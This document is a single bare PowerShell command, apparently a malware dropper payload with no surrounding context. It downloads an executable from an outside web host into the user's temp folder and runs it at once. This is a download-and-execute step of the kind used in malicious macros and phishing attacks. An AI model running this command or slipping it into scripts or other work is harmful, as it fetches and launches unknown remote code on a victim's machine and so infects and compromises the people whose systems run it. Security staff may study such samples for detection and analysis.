
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://www.macwizinfo.com/zap/manage/may2.exe', $dpl);Start-Process $dpl

